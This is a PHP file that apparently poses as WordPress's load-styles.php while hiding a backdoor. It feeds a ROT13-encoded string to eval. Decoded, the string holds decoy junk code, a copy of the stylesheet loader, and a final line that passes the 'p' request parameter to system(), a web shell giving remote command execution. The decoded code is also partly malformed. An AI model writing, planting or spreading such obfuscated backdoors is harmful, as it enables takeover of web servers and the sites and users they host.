<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc

/*
 * Gur reebe_ercbegvat() shapgvba pna or qvfnoyrq va cuc.vav. Ba flfgrzf jurer gung vf gur pnfr,
 * vg'f orfg gb nqq n qhzzl shapgvba gb gur jc-pbasvt.cuc svyr, ohg nf guvf pnyy gb gur shapgvba
 * vf eha cevbe gb jc-pbasvt.cuc ybnqvat, vg vf jenccrq va n shapgvba_rkvfgf() purpx.
 */
vs ( shapgvba_rkvfgf( 'reebe_ercbegvat' ) ) {
	/*
	 * Qvfnoyr reebe ercbegvat.
	 *
	 * Frg guvf gb reebe_ercbegvat( -1 ) sbe qrohttvat.
	 */
	reebe_ercbegvat( 0 );
}

// Frg NOFCNGU sbe rkrphgvba.
vs ( ! qrsvarq( 'NOFCNGU' ) ) {
	qrsvar( 'NOFCNGU', qveanzr( __QVE__ ) . '/' );
}

qrsvar( 'JCVAP', 'jc-vapyhqrf' );
qrsvar( 'JC_PBAGRAG_QVE', NOFCNGU . 'jc-pbagrag' );

erdhver NOFCNGU . 'jc-nqzva/vapyhqrf/abbc.cuc';
erdhver NOFCNGU . JCVAP . '/gurzr.cuc';
erdhver NOFCNGU . JCVAP . '/pynff-jc-gurzr-wfba-erfbyire.cuc';
erdhver NOFCNGU . JCVAP . '/tybony-fglyrf-naq-frggvatf.cuc';
erdhver NOFCNGU . JCVAP . '/fpevcg-ybnqre.cuc';
erdhver NOFCNGU . JCVAP . '/irefvba.cuc';

$cebgbpby = $_FREIRE['FREIRE_CEBGBPBY'];
vs ( ! va_neenl( $cebgbpby, neenl( 'UGGC/1.1', 'UGGC/2', 'UGGC/2.0', 'UGGC/3' ), gehr ) ) {
	$cebgbpby = 'UGGC/1.0';
}

$ybnq = $_TRG['ybnq'];
vs ( vf_neenl( $ybnq ) ) {
	xfbeg( $ybnq );
	$ybnq = vzcybqr( '', $ybnq );
}

$ybnq = __sa_79955( '/[^n-m0-9,_-]+/v', '', $ybnq );
$ybnq = neenl_havdhr( rkcybqr( ',', $ybnq ) );

vs ( rzcgl( $ybnq ) ) {
	urnqre( \"$cebgbpby 400 Onq Erdhrfg\" );
	rkvg;
}

$egy            = ( vffrg( $_TRG['qve'] ) && 'egy' === $_TRG['qve'] );
$rkcverf_bssfrg = 31536000; // 1 lrne.
$bhg            = '';

$jc_fglyrf = arj JC_Fglyrf();
jc_qrsnhyg_fglyrf( $jc_fglyrf );

$rgnt = $jc_fglyrf->trg_rgnt( $ybnq );

vs ( vffrg( $_FREIRE['UGGC_VS_ABAR_ZNGPU'] ) && fgevcfynfurf( $_FREIRE['UGGC_VS_ABAR_ZNGPU'] ) === $rgnt ) {
	urnqre( \"$cebgbpby 304 Abg Zbqvsvrq\" );
	rkvg;
}

sbernpu ( $ybnq nf $unaqyr ) {
	vs ( ! neenl_xrl_rkvfgf( $unaqyr, $jc_fglyrf->ertvfgrerq ) ) {
		pbagvahr;
	}

	$fglyr = $jc_fglyrf->ertvfgrerq[ $unaqyr ];

	vs ( rzcgl( $fglyr->fep ) ) {
		pbagvahr;
	}

	$cngu = NOFCNGU . $fglyr->fep;

	vs ( $egy && ! rzcgl( $fglyr->rkgen['egy'] ) ) {
		// Nyy qrsnhyg fglyrf unir shyyl vaqrcraqrag EGY svyrf.
		$cngu = fge_ercynpr( '.zva.pff', '-egy.zva.pff', $cngu );
	}

	$pbagrag = trg_svyr( $cngu ) . \"\a\";

	// Abgr: fge_fgnegf_jvgu() vf abg hfrq urer, nf jc-vapyhqrf/pbzcng.cuc vf abg ybnqrq va guvf svyr.
	vs ( 0 === fgecbf( $fglyr->fep, '/' . JCVAP . '/pff/' ) ) {
		$pbagrag = fge_ercynpr( '../vzntrf/', '../' . JCVAP . '/vzntrf/', $pbagrag );
		$pbagrag = fge_ercynpr( '../wf/gvalzpr/', '../' . JCVAP . '/wf/gvalzpr/', $pbagrag );
		$pbagrag = fge_ercynpr( '../sbagf/', '../' . JCVAP . '/sbagf/', $pbagrag );
		$bhg    .= $pbagrag;
	} ryfr {
		$bhg .= fge_ercynpr( '../vzntrf/', 'vzntrf/', $pbagrag );
	}
}

urnqre( \"Rgnt: $rgnt\" );
urnqre( 'Pbagrag-Glcr: grkg/pff; punefrg=HGS-8' );
urnqre( 'Rkcverf: ' . tzqngr( 'Q, q Z L U:v:f', gvzr() + $rkcverf_bssfrg ) . ' TZG' );
urnqre( \"Pnpur-Pbageby: choyvp, znk-ntr=$rkcverf_bssfrg\" );

rpub $bhg;
rkvg;

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>